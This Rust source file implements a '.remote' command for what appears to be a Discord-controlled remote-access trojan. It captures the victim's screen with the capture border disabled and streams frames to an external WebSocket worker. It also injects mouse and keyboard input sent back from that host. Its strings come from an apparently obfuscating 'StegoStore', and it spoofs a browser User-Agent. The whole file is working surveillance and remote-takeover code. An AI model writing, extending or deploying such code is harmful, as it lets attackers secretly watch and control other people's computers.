use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;
use tokio::sync::Mutex;
use once_cell::sync::Lazy;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Instant;
use crate::core::stego_store::{StegoStore, StringCategory};

use futures_util::{SinkExt, StreamExt};
use http::HeaderValue;
use tokio::sync::mpsc;
use tokio_tungstenite::{connect_async, tungstenite::Message as WsMessage};
use tokio_tungstenite::tungstenite::client::IntoClientRequest;
use windows::Win32::System::WinRT::{RoInitialize, RO_INIT_MULTITHREADED};
use windows_capture::{
    capture::{Context, GraphicsCaptureApiHandler},
    frame::Frame,
    graphics_capture_api::InternalCaptureControl,
    monitor::Monitor,
    settings::*,
};
use serde::{Deserialize, Serialize};
use enigo::{Enigo, Mouse, Keyboard, Settings as EnigoSettings, Button, Key, Direction, Coordinate, Axis};

static IS_RUNNING: AtomicBool = AtomicBool::new(false);
static STOP_SIGNAL: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));

#[derive(Serialize, Deserialize, Debug)]
#[serde(tag = "type")]
enum ControlMessage {
    #[serde(rename = "mouse_move")]
    MouseMove { x: f64, y: f64 },
    #[serde(rename = "mouse_down")]
    MouseDown { button: u32 },
    #[serde(rename = "mouse_up")]
    MouseUp { button: u32 },
    #[serde(rename = "key_down")]
    KeyDown { key: String },
    #[serde(rename = "key_up")]
    KeyUp { key: String },
    #[serde(rename = "mouse_scroll")]
    MouseScroll { dy: i32 },
    #[serde(rename = "notify")]
    Notify { message: String },
}

type FrameSender = mpsc::UnboundedSender<Vec<u8>>;

struct ScreenCaptureHandler {
    frame_tx: FrameSender,
    stop_signal: Arc<AtomicBool>,
    last_frame: Instant,
}

impl GraphicsCaptureApiHandler for ScreenCaptureHandler {
    type Flags = (FrameSender, Arc<AtomicBool>);
    type Error = anyhow::Error;

    fn new(ctx: Context<Self::Flags>) -> Result<Self> {
        Ok(Self {
            frame_tx: ctx.flags.0,
            stop_signal: ctx.flags.1,
            last_frame: Instant::now(),
        })
    }

    fn on_frame_arrived(
        &mut self,
        frame: &mut Frame,
        control: InternalCaptureControl,
    ) -> Result<()> {
        if self.stop_signal.load(Ordering::SeqCst) {
            let _ = control.stop();
            return Ok(());
        }

        // [Quick Fix] 15 FPS로 제한 (약 66ms 간격)
        if self.last_frame.elapsed().as_millis() < 66 {
            return Ok(());
        }
        self.last_frame = Instant::now();
        
        if let Ok(jpeg_data) = frame_to_fast_jpeg(frame) {
            let _ = self.frame_tx.send(jpeg_data); 
        }
        Ok(())
    }

    fn on_closed(&mut self) -> Result<()> {
        IS_RUNNING.store(false, Ordering::SeqCst);
        Ok(())
    }
}

fn frame_to_fast_jpeg(frame: &mut Frame) -> Result<Vec<u8>> {
    let width = frame.width();
    let height = frame.height();
    let mut buffer = frame.buffer()?;
    let raw_data = buffer.as_raw_buffer();
    
    let stride = raw_data.len() as u32 / height;

    // [Optimization] 정확한 다운샘플링 크기 계산 ((w+1)/2)
    let target_w = (width + 1) / 2;
    let target_h = (height + 1) / 2;
    
    let dest_size = (target_w * target_h * 3) as usize;
    let mut rgb_data = Vec::with_capacity(dest_size);
    unsafe { rgb_data.set_len(dest_size); } // 초기화 오버헤드 제거

    let dest_ptr: *mut u8 = rgb_data.as_mut_ptr();
    
    for (y_idx, y) in (0..height).step_by(2).enumerate() {
        let row_start = (y * stride) as usize;
        let row_data = &raw_data[row_start..];
        
        // 행 단위 포인터 계산
        let dest_row_start = y_idx * (target_w as usize) * 3;

        for (x_idx, x) in (0..width).step_by(2).enumerate() {
            let src_idx = (x * 4) as usize;
            let dest_idx = dest_row_start + (x_idx * 3);
            
            if src_idx + 2 < row_data.len() {
                unsafe {
                    // BGRA -> RGB (Bound check 제거로 속도 향상)
                    *dest_ptr.add(dest_idx) = *row_data.get_unchecked(src_idx + 2); // R
                    *dest_ptr.add(dest_idx + 1) = *row_data.get_unchecked(src_idx + 1); // G
                    *dest_ptr.add(dest_idx + 2) = *row_data.get_unchecked(src_idx);     // B
                }
            }
        }
    }

    let mut jpeg_buf = Vec::new();
    // [Quick Fix] 품질 30으로 설정하여 실시간성 확보   
    // [Quick Fix] 품질 25으로 설정하여 실시간성 추가 확보
    let mut encoder = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut jpeg_buf, 25);
    let _ = encoder.encode(&rgb_data, target_w, target_h, image::ExtendedColorType::Rgb8);

    let mut final_buf = Vec::with_capacity(jpeg_buf.len() + 1);
    final_buf.push(1u8); // Header
    final_buf.extend(jpeg_buf);
    Ok(final_buf)
}

fn map_key(key: &str) -> Option<Key> {
    match key {
        "Enter" => Some(Key::Return),
        "Backspace" => Some(Key::Backspace),
        "Tab" => Some(Key::Tab),
        "Escape" => Some(Key::Escape),
        " " => Some(Key::Space),
        "Control" => Some(Key::Control),
        "Shift" => Some(Key::Shift),
        "Alt" => Some(Key::Alt),
        "Meta" => Some(Key::Meta),
        "OS" => Some(Key::Meta),
        "ArrowUp" => Some(Key::UpArrow),
        "ArrowDown" => Some(Key::DownArrow),
        "ArrowLeft" => Some(Key::LeftArrow),
        "ArrowRight" => Some(Key::RightArrow),
        "Delete" => Some(Key::Delete),
        "End" => Some(Key::End),
        "Home" => Some(Key::Home),
        "PageUp" => Some(Key::PageUp),
        "PageDown" => Some(Key::PageDown),
        "F1" => Some(Key::F1),
        "F2" => Some(Key::F2),
        "F3" => Some(Key::F3),
        "F4" => Some(Key::F4),
        "F5" => Some(Key::F5),
        "F6" => Some(Key::F6),
        "F7" => Some(Key::F7),
        "F8" => Some(Key::F8),
        "F9" => Some(Key::F9),
        "F10" => Some(Key::F10),
        "F11" => Some(Key::F11),
        "F12" => Some(Key::F12),
        k if k.chars().count() == 1 => Some(Key::Unicode(k.chars().next().unwrap())),
        _ => None,
    }
}

async fn websocket_loop(
    worker_url: String,
    mut frame_rx: mpsc::UnboundedReceiver<Vec<u8>>,
    stop_signal: Arc<AtomicBool>,
    _http: Arc<HttpClient>,
    _channel_id: u64,
) -> Result<()> {
    let mut enigo = match Enigo::new(&EnigoSettings::default()) {
        Ok(e) => e,
        Err(_) => return Ok(()),
    };
    
    let (screen_w, screen_h) = match Monitor::primary() {
        Ok(monitor) => (monitor.width().unwrap_or(1920) as f64, monitor.height().unwrap_or(1080) as f64),
        Err(_) => (1920.0, 1080.0),
    };

    let shared_secret = crate::config::Config::get_shared_secret();

    while !stop_signal.load(Ordering::SeqCst) {
        let mut request = worker_url.clone().into_client_request()?;
        let headers = request.headers_mut();
        headers.insert("User-Agent", HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"));
        if let Ok(val) = HeaderValue::from_str(&shared_secret) {
            headers.insert("X-Shared-Secret", val);
        }

        if let Ok((ws_stream, _)) = connect_async(request).await {
            let (mut write, mut read) = ws_stream.split();

            loop {
                if stop_signal.load(Ordering::SeqCst) {
                    break;
                }
                tokio::select! {
                    Some(mut jpeg_data) = frame_rx.recv() => {
                        // [Quick Fix] 프레임 스킵 전략 강화 (큐에 쌓인 건 과감히 드랍)
                        while let Ok(latest) = frame_rx.try_recv() {
                            jpeg_data = latest;
                        }
                        
                        if write.send(WsMessage::Binary(jpeg_data)).await.is_err() {
                            break;
                        }
                    }
                    Some(Ok(msg)) = read.next() => {
                        match msg {
                            WsMessage::Text(text) => {
                                if let Ok(control) = serde_json::from_str::<ControlMessage>(&text) {
                                    match control {
                                        ControlMessage::MouseMove { x, y } => {
                                            let _ = enigo.move_mouse((x * screen_w) as i32, (y * screen_h) as i32, Coordinate::Abs);
                                        }
                                        ControlMessage::MouseDown { button } => {
                                            let btn = match button {
                                                0 => Button::Left,
                                                1 => Button::Middle,
                                                2 => Button::Right,
                                                _ => Button::Left,
                                            };
                                            let _ = enigo.button(btn, Direction::Press);
                                        }
                                        ControlMessage::MouseUp { button } => {
                                            let btn = match button {
                                                0 => Button::Left,
                                                1 => Button::Middle,
                                                2 => Button::Right,
                                                _ => Button::Left,
                                            };
                                            let _ = enigo.button(btn, Direction::Release);
                                        }
                                        ControlMessage::KeyDown { key } => {
                                            if let Some(enigo_key) = map_key(&key) {
                                                let _ = enigo.key(enigo_key, Direction::Press);
                                            }
                                        }
                                        ControlMessage::KeyUp { key } => {
                                            if let Some(enigo_key) = map_key(&key) {
                                                let _ = enigo.key(enigo_key, Direction::Release);
                                            }
                                        }
                                        ControlMessage::MouseScroll { dy } => {
                                            let _ = enigo.scroll(dy, Axis::Vertical);
                                        }
                                        ControlMessage::Notify { message } => {
                                            use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONINFORMATION};
                                            use std::os::windows::ffi::OsStrExt;
                                            let title = StegoStore::get(StringCategory::Msg, "NOTIFY_TITLE");
                                            let wide_msg: Vec<u16> = std::ffi::OsStr::new(&message).encode_wide().chain(std::iter::once(0)).collect();
                                            let wide_title: Vec<u16> = std::ffi::OsStr::new(&title).encode_wide().chain(std::iter::once(0)).collect();
                                            unsafe {
                                                MessageBoxW(std::ptr::null_mut(), wide_msg.as_ptr(), wide_title.as_ptr(), MB_OK | MB_ICONINFORMATION);
                                            }
                                        }
                                    }
                                }
                            }
                            WsMessage::Ping(p) => {
                                let _ = write.send(WsMessage::Pong(p)).await;
                            }
                            _ => {}
                        }
                    }
                    else => break,
                }
            }
        }
        if stop_signal.load(Ordering::SeqCst) {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_secs(3)).await;
    }
    Ok(())
}

pub struct ScreenShareCommand;

#[async_trait]
impl BotCommand for ScreenShareCommand {
    fn name(&self) -> &str { "remote" }
    fn description(&self) -> &str { "Start/stop remote screen control" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".remote <start|stop>" }
    fn examples(&self) -> &'static [&'static str] { &[".remote start", ".remote stop"] }
    fn aliases(&self) -> &'static [&'static str] { &["screenshare", "rdp"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = args.next().unwrap_or("start").to_lowercase();

        match action.as_str() {
            "start" => {
                if IS_RUNNING.load(Ordering::SeqCst) {
                    http.create_message(msg.channel_id.get(), "Remote control is already running.").await?;
                    return Ok(());
                }

                let room_id = msg.channel_id.get().to_string();
                let worker_url_str = crate::config::Config::get_screen_share_worker_url();
                let base_domain = worker_url_str.trim_start_matches("https://").trim_start_matches("http://").trim_end_matches('/');
                let public_link = format!("https://{}/?room={}", base_domain, room_id);

                IS_RUNNING.store(true, Ordering::SeqCst);
                STOP_SIGNAL.store(false, Ordering::SeqCst);

                let (frame_tx, frame_rx) = mpsc::unbounded_channel();
                let stop_signal_clone = STOP_SIGNAL.clone();

                let room_id_for_task = room_id.clone();
                let domain_clone = base_domain.to_string();
                let http_clone = http.clone();
                let channel_id = msg.channel_id.get();
                
                tokio::spawn(async move {
                    let worker_url = format!("wss://{}/?role=publisher&room={}", domain_clone, room_id_for_task);
                    let _ = websocket_loop(worker_url, frame_rx, stop_signal_clone, http_clone, channel_id).await;
                    IS_RUNNING.store(false, Ordering::SeqCst);
                });

                let stop_signal_for_capture = STOP_SIGNAL.clone();
                std::thread::spawn(move || {
                    let _ = (|| -> Result<()> {
                        unsafe { RoInitialize(RO_INIT_MULTITHREADED)?; }
                        let monitor = Monitor::primary()?;
                        let settings = Settings::new(
                            monitor,
                            CursorCaptureSettings::WithCursor,
                            DrawBorderSettings::WithoutBorder,
                            SecondaryWindowSettings::Default,
                            MinimumUpdateIntervalSettings::Default,
                            DirtyRegionSettings::Default,
                            ColorFormat::Bgra8,
                            (frame_tx, stop_signal_for_capture),
                        );
                        ScreenCaptureHandler::start(settings)?;
                        Ok(())
                    })();
                });

                let app_id = StegoStore::get(StringCategory::Msg, "REMOTE_APP_ID");
                let discord_base = StegoStore::get(StringCategory::Url, "DISCORD_BASE");
                let activity_launcher = match http.create_invite_to_activity(msg.channel_id.get(), &app_id).await {
                    Ok(url) => url,
                    Err(_) => format!("{}/activities/{}", discord_base, app_id),
                };

                let content = StegoStore::get(StringCategory::Msg, "REMOTE_READY_FMT")
                    .replace("{link}", &public_link)
                    .replace("{room}", &room_id);

                let components = serde_json::json!([{
                    "type": 1,
                    "components": [{
                        "type": 2,
                        "style": 5,
                        "label": "🚀 Launch Remote Desktop",
                        "url": activity_launcher
                    }]
                }]);

                http.create_message_with_components(msg.channel_id.get(), &content, components).await?;
            }
            "stop" => {
                if !IS_RUNNING.load(Ordering::SeqCst) {
                    http.create_message(msg.channel_id.get(), "Remote control is not running.").await?;
                    return Ok(());
                }

                STOP_SIGNAL.store(true, Ordering::SeqCst);
                IS_RUNNING.store(false, Ordering::SeqCst);
                http.create_message(msg.channel_id.get(), "Remote control stopping...").await?;
            }
            _ => {
                http.create_message(msg.channel_id.get(), "Usage: `.remote <start|stop>`").await?;
            }
        }
        Ok(())
    }
}
